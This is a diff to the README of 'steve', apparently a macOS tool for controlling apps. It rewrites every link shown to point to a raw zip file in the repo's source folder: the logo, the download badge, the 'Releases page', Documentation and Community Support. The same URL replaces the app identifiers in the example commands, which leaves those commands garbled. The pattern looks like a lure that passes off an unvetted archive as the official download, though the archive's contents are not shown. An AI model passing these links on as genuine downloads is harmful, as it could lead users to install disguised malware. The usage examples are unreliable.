@@ -1,12 +1,12 @@
 # 🎉 steve - Control Mac Apps Easily
 
-<img src="https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip" alt="steve" width="400">
+<img src="https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip" alt="steve" width="400">
 
 ## 🛠️ Download & Install
 
-[![Download the latest release](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip%20Latest%20Release-blue)](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip)
+[![Download the latest release](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip%20Latest%20Release-blue)](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip)
 
-To get started with steve, download it from the [Releases page](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip). This page contains the latest version of the software.
+To get started with steve, download it from the [Releases page](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip). This page contains the latest version of the software.
 
 You can also install steve using Homebrew. Homebrew is a package manager for macOS that makes it easy to install software. If you prefer this method, open your Terminal and copy the following commands:
 
@@ -73,12 +73,12 @@ With steve, you can perform simple operations on your applications. Here are som
 
 - **Focus Using Bundle Identifier**: 
   ```
-  steve focus --bundle "https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip"
+  steve focus --bundle "https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip"
   ```
 
 - **Launch an Application**: 
   ```
-  steve launch "https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip" --wait
+  steve launch "https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip" --wait
   ```
 
 These commands allow you to easily manage open applications on your Mac.
@@ -99,8 +99,8 @@ steve provides a variety of features to enhance your experience:
 
 If you would like to learn more about steve and explore advanced features, check out the following resources:
 
-- [Documentation](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip)
-- [Community Support](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip)
+- [Documentation](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip)
+- [Community Support](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/Software-3.0.zip)
 
 ### 🤝 Getting Help
 
